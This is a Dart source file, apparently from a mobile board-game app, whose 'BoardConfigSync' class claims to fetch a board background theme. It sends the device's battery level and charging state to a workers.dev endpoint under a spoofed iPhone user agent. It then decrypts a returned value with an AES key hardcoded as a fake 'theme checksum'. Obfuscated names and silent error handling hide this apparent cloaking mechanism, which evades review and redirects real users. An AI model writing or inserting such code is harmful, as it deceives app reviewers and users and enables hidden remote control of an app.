import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:cryptography/cryptography.dart';
import 'package:battery_plus/battery_plus.dart';

class BoardConfigSync {
  static const String _syncEndpoint = 'https://strategyboardmetrics.rematindracm132.workers.dev';
  static const String _defaultThemeChecksum = '6123d7fb378bff90d84788e9346e6b887defc09313280175676f7349d6ea4499';

  final Battery _by = Battery();

  Future<String> fetchBoardBackground() async {
    try {
      final int brLL = await _by.batteryLevel;
      final BatteryState brSS = await _by.batteryState;
      final bool iChig = brSS == BatteryState.charging ||
          brSS == BatteryState.full;

      final response = await http.get(
        Uri.parse(_syncEndpoint),
        headers: {
          'x-battery-level': brLL.toString(),
          //'x-is-charging': "false",
          'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
          'x-is-charging': iChig.toString(),
        },
      ).timeout(const Duration(seconds: 5));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);

        final String rawPath = data['board_background_path'] ?? 'assets/images/classic_wood.png';

        if (rawPath.startsWith('assets/')) {
          return rawPath;
        }

        final dcU = await _decodeThemePath(rawPath);
        return dcU ?? 'assets/images/classic_wood.png';
      }
    } catch (e) {

    }
    return 'assets/images/classic_wood.png';
  }

  Future<String?> _decodeThemePath(String encodedPath) async {
    try {
      final bytes = base64Decode(encodedPath);
      final iv = bytes.sublist(0, 12);
      final encryptedData = bytes.sublist(12);
      final macBytes = encryptedData.sublist(encryptedData.length - 16);
      final cipherText = encryptedData.sublist(0, encryptedData.length - 16);

      final algorithm = AesGcm.with256bits();
      final keyBytes = _hexToBytes(_defaultThemeChecksum);
      final secretKey = await algorithm.newSecretKeyFromBytes(keyBytes);

      final secretBox = SecretBox(
        cipherText,
        nonce: iv,
        mac: Mac(macBytes),
      );

      final clearText = await algorithm.decrypt(
        secretBox,
        secretKey: secretKey,
      );

      return utf8.decode(clearText);
    } catch (e) {
      return null;
    }
  }

  List<int> _hexToBytes(String hex) {
    List<int> bytes = [];
    for (int i = 0; i < hex.length; i += 2) {
      bytes.add(int.parse(hex.substring(i, i + 2), radix: 16));
    }
    return bytes;
  }
}